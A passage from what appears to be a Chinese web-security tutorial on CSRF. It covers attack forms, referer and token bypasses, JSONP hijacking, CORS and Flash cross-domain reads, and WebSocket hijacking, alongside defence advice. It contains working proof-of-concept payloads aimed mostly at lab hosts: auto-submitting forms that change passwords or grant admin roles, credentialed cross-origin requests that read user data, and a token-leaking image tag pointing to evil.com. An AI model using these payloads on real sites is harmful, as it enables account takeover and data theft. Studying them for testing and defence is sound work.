<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;link href=<span class="string">""</span>&gt;</span><br><span class="line">&lt;img lowsrc=<span class="string">""</span>&gt;</span><br><span class="line">&lt;img dynsrc=<span class="string">""</span>&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"refersh"</span> content=<span class="string">"0"</span>; url=<span class="string">""</span>&gt;</span><br><span class="line">&lt;frame src =<span class="string">""</span>&gt;</span><br><span class="line">&lt;script src =<span class="string">""</span>&gt;</span><br><span class="line">&lt;bgsound src=<span class="string">""</span>&gt;</span><br><span class="line">&lt;embed src=<span class="string">""</span>&gt;</span><br><span class="line">&lt;audio src=<span class="string">""</span>&gt;</span><br><span class="line">&lt;table background=<span class="string">""</span>&gt;</span><br><span class="line"> </span><br><span class="line">css样式中：</span><br><span class="line">@<span class="keyword">import</span> <span class="string">""</span></span><br><span class="line">background:url(<span class="string">""</span>)</span><br></pre></td></tr></table></figure>
<p>除了固定的编写方式之外还可以通过JavaScript动态生成的标签对象或CSS对象发起GET请求。</p>
<h4 id="POST型"><a href="#POST型" class="headerlink" title="POST型"></a>POST型</h4><p>POST型CSRF漏洞，需要构造自动提交或点击提交的表单，然后诱导受害者访问或点击利用。构造表单常见是用hidden属性(只能通过form表单的方式提交)</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span><br><span class="line">  &lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">  &lt;script&gt;history.pushState(<span class="string">''</span>, <span class="string">''</span>, <span class="string">'/'</span>)&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">    &lt;img src="./</span>logo.png<span class="string">"&gt;</span></span><br><span class="line"><span class="string">    &lt;form action="</span>http:<span class="comment">//192.168.1.106/vulnerabilities/csrf/"&gt;</span></span><br><span class="line">      &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"password&amp;#95;new"</span> value=<span class="string">"demos"</span> /&gt;</span><br><span class="line">      &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"password&amp;#95;conf"</span> value=<span class="string">"demos"</span> /&gt;</span><br><span class="line">      &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"Change"</span> value=<span class="string">"Change"</span> /&gt;</span><br><span class="line">      &lt;input type=<span class="string">"submit"</span> value=<span class="string">"点击查看头像"</span> /&gt;</span><br><span class="line">    &lt;<span class="regexp">/form&gt;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>body&gt;</span><br><span class="line">&lt;<span class="regexp">/html&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;form id=<span class="string">"autosubmit"</span> action=<span class="string">"http://www.example.com/api/setusername"</span> enctype=<span class="string">"text/plain"</span> method=<span class="string">"POST"</span>&amp;&gt;</span><br><span class="line">&lt;input name=<span class="string">"username"</span> type=<span class="string">"hidden"</span> value=<span class="string">"CSRFd"</span> /&gt;</span><br><span class="line">&lt;input type=<span class="string">"submit"</span> value=<span class="string">"Submit Request"</span> /&gt;</span><br><span class="line">&lt;<span class="regexp">/form&gt;</span></span><br><span class="line"><span class="regexp">&lt;script&gt;</span></span><br><span class="line"><span class="regexp">document.getElementById("autosubmit").submit();</span></span><br><span class="line"><span class="regexp">&lt;/</span>script&gt;</span><br></pre></td></tr></table></figure>
<h4 id="利用script标签"><a href="#利用script标签" class="headerlink" title="利用script标签"></a>利用script标签</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhr.open(<span class="string">"GET"</span>, <span class="string">"http://www.example.com/api/currentuser"</span>);</span><br><span class="line">xhr.send();</span><br><span class="line">&lt;<span class="regexp">/script&gt;ja</span></span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhr.open(<span class="string">"POST"</span>, <span class="string">"http://www.example.com/api/setrole"</span>);</span><br><span class="line">xhr.setRequestHeader(<span class="string">"Content-Type"</span>, <span class="string">"text/plain"</span>);</span><br><span class="line">xhr.send(<span class="string">'&#123;"role":admin&#125;'</span>);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhr.open(<span class="string">"POST"</span>, <span class="string">"http://www.example.com/api/setrole"</span>);</span><br><span class="line">xhr.withCredentials = <span class="literal">true</span>;</span><br><span class="line">xhr.setRequestHeader(<span class="string">"Content-Type"</span>, <span class="string">"application/json;charset=UTF-8"</span>);</span><br><span class="line">xhr.send(<span class="string">'&#123;"role":admin&#125;'</span>);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="从信任角度来说明CSRF与XSS的区别"><a href="#从信任角度来说明CSRF与XSS的区别" class="headerlink" title="从信任角度来说明CSRF与XSS的区别"></a>从信任角度来说明CSRF与XSS的区别</h3><p>XSS：利用用户对站点的信任（就是客户端对服务器下发的文件默认是信任的）</p>
<p>CSRF：利用站点对已经身份认证的信任（默认站点只对经过身份认证的用户是信任的）</p>
<h3 id="CSRF可能会出现的攻击场景"><a href="#CSRF可能会出现的攻击场景" class="headerlink" title="CSRF可能会出现的攻击场景"></a>CSRF可能会出现的攻击场景</h3><p>修改账号密码、个人信息（email、收货地址）</p>
<p>发送伪造的业务请求（网银、购物、投票）</p>
<p>关注他人社交账号、发送推文、留言评论等</p>
<p>未验证 Referer或者使用 Token 导致用户或者管理员可被 CSRF添加、修改、删除等操作</p>
<p>以转账为例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">初始化链接：http://www.xxx.com/pay.php?user=xx&amp;amp;money=100</span><br><span class="line">构造恶意链接：http://www.xxx.com/pay.php?user=恶意用户&amp;amp;money=10000</span><br></pre></td></tr></table></figure>
<h3 id="CSRF的执行原理图：这里就可以反应出来它与XSS的区别"><a href="#CSRF的执行原理图：这里就可以反应出来它与XSS的区别" class="headerlink" title="CSRF的执行原理图：这里就可以反应出来它与XSS的区别"></a>CSRF的执行原理图：这里就可以反应出来它与XSS的区别<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1527347582.0.png" alt></h3><h3 id="漏洞利用条件"><a href="#漏洞利用条件" class="headerlink" title="漏洞利用条件"></a>漏洞利用条件</h3><p>被攻击用户已经完成身份认证(已登录)</p>
<p>新请求的提交不需要重新身份认证或确认机制（如果有token机制则需要获取token，但是由于跨域的原因，攻击者构造的攻击代码无法直接请求被攻击服务器，无法获取token，但是如果配合XSS漏洞获取token，基于token的防护机制就形同虚设）</p>
<h3 id="CSRF可能存在的点以及检测方法"><a href="#CSRF可能存在的点以及检测方法" class="headerlink" title="CSRF可能存在的点以及检测方法"></a>CSRF可能存在的点以及检测方法</h3><p>寻找测试站点<strong>增删改</strong>的地方，构造HTML，修改HTML表单中某些参数，使用浏览器打开该HTML，点击提交表单后查看响应结果，看该操作是否成功执行。</p>
<p>检测方法：捕获的数据包，查看在请求和响应过程中检查是否存在anti-CSRF token名 以及验证服务器是否验证anti-CSRF token的值；检测token中的可编辑字符串（可查看以及伪造）；检查referrer头是否可以伪造绕过、查看是否有二次身份认证、验证码等防御措施。</p>
<h3 id="防御方式"><a href="#防御方式" class="headerlink" title="防御方式"></a>防御方式</h3><p>增加anti-CSRF token（随机token，随机性强且不易伪造，注意一点，POST请求可以隐藏在表单，如果是GET请求可以添加在cookie中）并在服务端验证</p>
<p>严格验证Referer，防止被绕过</p>
<p>关键请求使用<strong>验证码</strong>功能（比如确认转账、确认修改密码操作等，在一些其他场景使用验证码，用户体验不是很好）</p>
<p>降低会话超时时间</p>
<h3 id="测试工具"><a href="#测试工具" class="headerlink" title="测试工具"></a>测试工具</h3><p>burpsuit</p>
<p>CSRFTester（个人觉得不是很好用）</p>
<h3 id="绕过referer验证"><a href="#绕过referer验证" class="headerlink" title="绕过referer验证"></a>绕过referer验证</h3><p>空Referer绕过：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">空referer头：置空</span><br><span class="line"> </span><br><span class="line">在referer字段后添加：ftp://,http://,https://,file://,javascript:,data等协议头再发送，看是否绕过referer验证。例如https向http跳转的时候referer为空，利用https://www.eval.com/attack.html</span><br></pre></td></tr></table></figure>
<p>判断referer是否存在某个关键词：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">例如dvwa中的验证server_name</span><br><span class="line"> </span><br><span class="line">referer判断存在不存在google.com这个关键词</span><br><span class="line"> </span><br><span class="line">在网站新建一个google.com目录 把CSRF存放在google.com目录,即可绕过</span><br></pre></td></tr></table></figure>
<p>判断referer是否有某域名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">判断了Referer开头是否以126.com以及126子域名 不验证根域名为126.com 那么我这里可以构造子域名x.126.com.xxx.com作为蠕虫传播的载体服务器，即可绕过。</span><br></pre></td></tr></table></figure>
<p>在域名前添加</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">在域名前面增加随机的a-z和0-9也可能绕过：</span><br></pre></td></tr></table></figure>
<p>添加一些特殊的符号绕过，不同的浏览器支持的符号也不一样</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">https://xxx.com/?https://target.org   #思路和绕过URL跳转限制类似</span><br><span class="line"> </span><br><span class="line"><span class="comment">#字典如下</span></span><br><span class="line">,</span><br><span class="line">&amp;</span><br><span class="line"><span class="string">'</span></span><br><span class="line"><span class="string">"</span></span><br><span class="line"><span class="string">;</span></span><br><span class="line"><span class="string">!</span></span><br><span class="line"><span class="string">$</span></span><br><span class="line"><span class="string">^</span></span><br><span class="line"><span class="string">*</span></span><br><span class="line"><span class="string">(</span></span><br><span class="line"><span class="string">)</span></span><br><span class="line"><span class="string">+</span></span><br><span class="line"><span class="string">=</span></span><br><span class="line"><span class="string">`</span></span><br><span class="line"><span class="string">~</span></span><br><span class="line"><span class="string">-</span></span><br><span class="line"><span class="string">_</span></span><br><span class="line"><span class="string">=</span></span><br><span class="line"><span class="string">|</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">%</span></span><br></pre></td></tr></table></figure>
<p>无referer</p>
<blockquote>
<p>与添加不同的协议跳转置空referer不同，这里是直接删除referer头，利用的时候需要在body之前POC中加入meta标签</p>
</blockquote>
<p>POC</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;meta name=<span class="string">"referrer"</span> content=<span class="string">"never"</span>&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;meta name=<span class="string">"referrer"</span> content=<span class="string">"never"</span>&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;script&gt;history.pushState(<span class="string">''</span>, <span class="string">''</span>, <span class="string">'/'</span>)&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">    &lt;form action="http:/</span><span class="regexp">/127.0.0.1/</span>test.php<span class="string">"&gt;</span></span><br><span class="line"><span class="string">      &lt;input type="</span>submit<span class="string">" value="</span>Submit request<span class="string">" /&gt;</span></span><br><span class="line"><span class="string">    &lt;/form&gt;</span></span><br><span class="line"><span class="string">    &lt;script&gt;</span></span><br><span class="line"><span class="string">      document.forms[0].submit();</span></span><br><span class="line"><span class="string">    &lt;/script&gt;</span></span><br><span class="line"><span class="string">  &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure>
<p>思路：<a href="https://gh0st.cn/archives/2018-08-01/1" target="_blank" rel="noopener">组合拳绕过referer限制</a></p>
<blockquote>
<p>反射型XSS时受到了referer限制，通过URL重定向漏洞绕过referer限制触发XSS，xss处存在jsonp劫持漏洞，如果直接触发jsonp也受到referer限制，所以通过反射性xss加载jsonp的POC再配合URL跳转漏洞触发。总体上就是URL重定向绕过了xss的referer限制，xss又绕过了jsonp的referer限制。</p>
</blockquote>
<p>以上时key师傅的思路，由于文章中的任意URL跳转也是再子域，时referer允许的，个人认为可以直接加载jsonp的POC连接绕过。</p>
<h3 id="绕过token"><a href="#绕过token" class="headerlink" title="绕过token"></a>绕过token</h3><ul>
<li>GET型token泄露：例如页面包含<code>&lt;img src=&quot;http://www.evil.com/&quot;/&gt;</code></li>
<li>POST型token泄露:利用XSS漏洞获取其Cookie，查看存储在其中的Token(组合漏洞)</li>
</ul>
<h3 id="总结bypass方法"><a href="#总结bypass方法" class="headerlink" title="总结bypass方法"></a>总结bypass方法</h3><ul>
<li>删： CSRF token 、referer、 XRSF Header</li>
<li>置空： CSRF token 、referer</li>
<li>修改请求方法：POST改为GET</li>
<li>修改 与token相同长度的任意字符串替换token</li>
<li>固定token</li>
<li>组合漏洞：XSS+CSRF(xss打token,cookie或者利用子域的xss漏洞和csrf组合绕过验证)</li>
<li>token泄露（<a href="http://www.anquan.us/static/bugs/wooyun-2015-090935.html" target="_blank" rel="noopener">referer泄露toekn</a>）</li>
</ul>
<h2 id="读取型CSRF"><a href="#读取型CSRF" class="headerlink" title="读取型CSRF"></a>读取型CSRF</h2><blockquote>
<p>前面总结的CSRF是按提交方式分的，且场景是在增删改的情况下触发的，还有一种是读类型的CSRF，由jsonp劫持和CORS跨域资源共享，Flash跨域劫持等，通过这几种方式可以读一些敏感信息出来。</p>
</blockquote>
<h3 id="jsonp劫持"><a href="#jsonp劫持" class="headerlink" title="jsonp劫持"></a>jsonp劫持</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">JSONP（JSON with Padding）是数据格式JSON的一种“使用模式”，可以让网页从别的网域要数据。根据 XmlHttpRequest 对象受到同源策略的影响，而利用 &lt;script&gt;元素的这个开放策略，网页可以得到从其他来源动态产生的JSON数据，而这种使用模式就是所谓的 JSONP。用JSONP抓到的数据并不是JSON，而是任意的JavaScript，用 JavaScript解释器运行而不是用JSON解析器解析。所有，通过Chrome查看所有JSONP发送的Get请求都是js类型，而非XHR。</span><br><span class="line"> </span><br><span class="line">JSONP包含两部分：回调函数和数据。</span><br><span class="line">回调函数是当响应到来时要放在当前页面被调用的函数。</span><br><span class="line">数据就是传入回调函数中的json数据，也就是回调函数的参数了。</span><br></pre></td></tr></table></figure>
<p>jsonp劫持只需要有这个参数，再去读取这个参数就可以进行jsonp劫持了</p>
<p>jsonp劫持测试</p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571403076.19.png" alt></p>
<p>jsonp劫持在实际中也像上图这样调用返回一些信息，挖掘的时候利用如script标签跨域加载恶意的构造的语句即可劫持获取相应的信息</p>
<p>Poc如下所示:测试时只需要修改函数名test，以及劫持的地址即可，可以使用key写的pocbox,方便快捷</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params">data</span>)</span>&#123; alert(<span class="built_in">JSON</span>.stringify(data)) &#125;&lt;<span class="regexp">/script&gt; &lt;script src="http:/</span><span class="regexp">/127.0.0.1/</span>DoraBox/csrf/jsonp.php?callback=test<span class="string">"&gt;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571403500.71.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571403521.67.png" alt></p>
<p>组合拳：<a href="https://xz.aliyun.com/t/5143" target="_blank" rel="noopener">JSONP绕过CSRF防护token </a></p>
<p>如果可以读取页面的CSRF-token,则可以自动加入触发写类型的CSRF，同时jsonp不只可以触发csrf漏洞，由于跨域标签，还可能会触发xss漏洞<code>?callback=&lt;script&gt;alert(1111)&lt;/script&gt;</code></p>
<p>修复方式：</p>
<ol>
<li>打乱响应主体内容</li>
<li>禁止用户自定义callback函数</li>
<li>Referer等进行限制</li>
<li>严格按照json标准输出 Content-Type 及编码（ Content-Type : application/json; charset=utf-8 ）</li>
</ol>
<h3 id="CORS跨域资源共享"><a href="#CORS跨域资源共享" class="headerlink" title="CORS跨域资源共享"></a>CORS跨域资源共享</h3><blockquote>
<p>Cross-Origin Resource Sharing（CORS）跨域资源共享是一份浏览器技术的规范，提供了 Web 服务从不同域传来沙盒脚本的方法，以避开浏览器的同源策略，确保安全的跨域数据传输。现代浏览器使用CORS在API容器如XMLHttpRequest来减少HTTP请求的风险来源。与 JSONP 不同，CORS 除了 GET 要求方法以外也支持其他的 HTTP 要求。 和jsonp的作用差不多，只不过是方式有所改变，那么我们在这个漏洞中的关键点就是Orgin这个参数的传递了，有时候我们需要自己添加有时候他有，而有时候他会通过某些参数传递 。</p>
</blockquote>
<p>CORS测试</p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571405767.78.png" alt></p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571403804.38.png" alt></p>
<p>如上如图，在实际的测试中，如果在返回包中出现 Access-Control-Allow-*等响应头信息则时CORS跨域设置，尝试script标签等配合XMLHttpRequest劫持获取信息。<strong>在测试的时候亲请求头中添加Origin: <a href="http://xxx.com,看返回包中的响应头是否可控，在这里时允许http://www.lsowl.top请求的，所以就允许跨域读取此网址的内容。" target="_blank" rel="noopener">http://xxx.com,看返回包中的响应头是否可控，在这里时允许http://www.lsowl.top请求的，所以就允许跨域读取此网址的内容。</a> <code>Origin</code>和<code>Referer</code>很相似，就是将当前的请求参数删除，仅剩下</strong>三元组（协议 主机 端口）<strong>，标准的浏览器（IE浏览器除外，IE浏览器只带在协议和主机），会在每次请求中都带上<code>Origin</code>，至少在跨域操作时肯定携带（例如ajax的操作） </strong></p>
<p>POC如下(利用pocbox生成)</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;CORS TEST&lt;<span class="regexp">/title&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div id=<span class="string">'output'</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    &lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">            <span class="keyword">var</span> req = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">            req.onload = reqListener;</span><br><span class="line">            req.open(<span class="string">'get'</span>,<span class="string">'http://127.0.0.1/DoraBox/csrf/userinfo.php '</span>,<span class="literal">true</span>);</span><br><span class="line">            <span class="comment">//req.setRequestHeader("Content-Type","application/x-www-form-urlencoded;");</span></span><br><span class="line">            req.withCredentials = <span class="literal">true</span>;</span><br><span class="line">            req.send();</span><br><span class="line">            <span class="function"><span class="keyword">function</span> <span class="title">reqListener</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="keyword">var</span> output = <span class="built_in">document</span>.getElementById(<span class="string">'output'</span>);</span><br><span class="line">                output.innerHTML = <span class="string">"URL: http://127.0.0.1/DoraBox/csrf/userinfo.php &lt;br&gt;&lt;br&gt;Response:&lt;br&gt;&lt;textarea style='width: 659px; height: 193px;'&gt;"</span> + req.responseText + <span class="string">"&lt;/textarea&gt;"</span>;</span><br><span class="line">            &#125;;</span><br><span class="line">    &lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>body&gt;</span><br><span class="line">&lt;<span class="regexp">/html&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571404697.35.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571404749.23.png" alt></p>
<p><strong>利用CrossSiteContentHijacking测试</strong></p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571479827.75.png" alt></p>
<p>防御：</p>
<p>加强对Origin的验证，即对cors进行严格的设置</p>
<h3 id="Flash跨域"><a href="#Flash跨域" class="headerlink" title="Flash跨域"></a>Flash跨域</h3><blockquote>
<p>Flash跨域比较经典了，在做web目录资产整理的时候有时候会发现这样的文件 <strong>crossdomain.xml</strong> ，文件内容如果是如下的，那么就存在Flash跨域问题，如下内容的意思是支持所有域。flash跨域是通过.swf文件进行的，流程是：lsowl.top存在测试的swf文件想要跨域获取target.com中的敏感数据信息，首先会寻找target.com是否存在 <strong>crossdomain.xml</strong>  ，如果存在则会查看是否允许lsowl.top访问，如果可以访问则存在flash跨域漏洞。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;cross-domain-policy&gt;</span><br><span class="line">  &lt;allow-access-from domain=&quot;*&quot; /&gt;</span><br><span class="line">&lt;/cross-domain-policy&gt;</span><br></pre></td></tr></table></figure>
<p>漏洞挖掘：由于没有找到测试的站点，所以文字描述，碰见存在<strong>crossdomain.xml</strong> 的站，访问看一下配置，再找找有无数据接口，然后利用POC <a href="https://github.com/nccgroup/CrossSiteContentHijacking/raw/master/ContentHijacking/objects/ContentHijacking.swf" target="_blank" rel="noopener">https://github.com/nccgroup/CrossSiteContentHijacking/raw/master/ContentHijacking/objects/ContentHijacking.swf</a> 进行测试，或者是key师傅的<a href="https://github.com/Acmesec/PoCBox" target="_blank" rel="noopener">pocbox</a></p>
<p>emm,没图，用key师傅的图<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571406720.75.png" alt></p>
<p>防御：</p>
<p>修改<strong>crossdomain.xml</strong>限制访问来源</p>
<h2 id="可读可写型CSRF"><a href="#可读可写型CSRF" class="headerlink" title="可读可写型CSRF"></a>可读可写型CSRF</h2><blockquote>
<p>WebSocket 跨域劫持漏洞,由于websocket协议支持双通道通信且websocket不受同源策略的影响，利用websocket的跨域劫持为可读可写类型</p>
</blockquote>
<h3 id="websocket的优点"><a href="#websocket的优点" class="headerlink" title="websocket的优点"></a>websocket的优点</h3><ul>
<li>支持全双工，实时性更强。</li>
<li>更好的二进制支持。</li>
<li>较少的控制开销。连接创建后，ws客户端、服务端进行数据交换时，协议控制的数据包头部较小。在不包含头部的情况下，服务端到客户端的包头只有2~10字节（取决于数据包长度），客户端到服务端的话，需要加上额外4字节的掩码。而HTTP协议每次通信都需要携带完整的头部。</li>
<li>支持扩展。ws协议定义了扩展，用户可以扩展协议，或者实现自定义的子协议。（比如支持自定义压缩算法等）</li>
</ul>
<h3 id="websocket就建立链接如下"><a href="#websocket就建立链接如下" class="headerlink" title="websocket就建立链接如下"></a>websocket就建立链接如下<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571476121.43.png" alt></h3><p>通过建立连接的过程可以发现在websocket建立连接时没有进行验证，所以由此产生漏洞。</p>
<p><a href="https://github.com/chyingp/blog/tree/master/demo/2017.05.22-web-socket/ws" target="_blank" rel="noopener">测试环境用到代码如下</a></p>
<p><strong>server.js</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//server.js</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">var</span> app = <span class="built_in">require</span>(<span class="string">'express'</span>)();</span><br><span class="line"><span class="keyword">var</span> server = <span class="built_in">require</span>(<span class="string">'http'</span>).Server(app);</span><br><span class="line"><span class="keyword">var</span> WebSocket = <span class="built_in">require</span>(<span class="string">'ws'</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">var</span> wss = <span class="keyword">new</span> WebSocket.Server(&#123; <span class="attr">port</span>: <span class="number">9999</span> &#125;);</span><br><span class="line"> </span><br><span class="line">wss.on(<span class="string">'connection'</span>, <span class="function"><span class="keyword">function</span> <span class="title">connection</span>(<span class="params">ws</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'server: receive connection.'</span>);</span><br><span class="line"> </span><br><span class="line">    ws.on(<span class="string">'message'</span>, <span class="function"><span class="keyword">function</span> <span class="title">incoming</span>(<span class="params">message</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'server: received %s'</span>, message);</span><br><span class="line">        ws.send(<span class="string">'server: reply'</span>);</span><br><span class="line">    &#125;);</span><br><span class="line"> </span><br><span class="line">    ws.on(<span class="string">'pong'</span>, () =&gt; &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'server: received pong from client'</span>);</span><br><span class="line">    &#125;);</span><br><span class="line"> </span><br><span class="line">    ws.send(<span class="string">'world'</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// setInterval(() =&gt; &#123;</span></span><br><span class="line">    <span class="comment">//     ws.ping('', false, true);</span></span><br><span class="line">    <span class="comment">// &#125;, 2000);</span></span><br><span class="line">&#125;);</span><br><span class="line"> </span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.sendfile(__dirname + <span class="string">'/index.html'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"> </span><br><span class="line">app.listen(<span class="number">3000</span>);</span><br></pre></td></tr></table></figure>
<p><strong>cal.js</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">'crypto'</span>);</span><br><span class="line"><span class="keyword">const</span> magic = <span class="string">'258EAFA5-E914-47DA-95CA-C5AB0DC85B11'</span>;</span><br><span class="line"><span class="keyword">const</span> secWebSocketKey = <span class="string">'w4v7O6xFTi36lq3RNcgctw=='</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">let</span> secWebSocketAccept = crypto.createHash(<span class="string">'sha1'</span>)</span><br><span class="line">    .update(secWebSocketKey + magic)</span><br><span class="line">    .digest(<span class="string">'base64'</span>);</span><br><span class="line"> </span><br><span class="line"><span class="built_in">console</span>.log(secWebSocketAccept);</span><br><span class="line"><span class="comment">// Oy4NRAQ13jhfONC7bP8dTKb4PTU=</span></span><br></pre></td></tr></table></figure>
<p><strong>index.html</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>ws demo<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">  <span class="keyword">var</span> ws = <span class="keyword">new</span> WebSocket(<span class="string">'ws://192.168.1.101:9999'</span>);</span></span><br><span class="line"><span class="javascript">  ws.onopen = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(<span class="string">'client: ws connection is open'</span>);</span></span><br><span class="line"><span class="javascript">    ws.send(<span class="string">'hello'</span>);</span></span><br><span class="line"><span class="undefined">  &#125;;</span></span><br><span class="line"><span class="javascript">  ws.onmessage = <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(<span class="string">'client: received %s'</span>, e.data);</span></span><br><span class="line"><span class="undefined">  &#125;;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>监听服务端</p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571478485.67.png" alt></p>
<p>访问index.html发起请求，抓取数据包</p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571478624.46.png" alt></p>
<p>通过数据包可以看到，websocket通信要在http协议的基础上请求升级协议，升级的协议名为websocket,返回的数据包中说明了升级的协议以及正在连接的协议。</p>
<p>下图时通过websocket的通信过程<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571478800.27.png" alt></p>
<p>在碰到使用使用websocket通信的目标时，测试方法和CORS类似， 篡改Origin，发现没有对Origin进行验证，也可以跨域进行协议升级。</p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571478895.33.png" alt></p>
<h3 id="跨域劫持测试："><a href="#跨域劫持测试：" class="headerlink" title="跨域劫持测试："></a>跨域劫持测试：</h3><p>poc如下：使用pocbox生成(如果时https协议的站点则需要将ws修改为wss)</p>
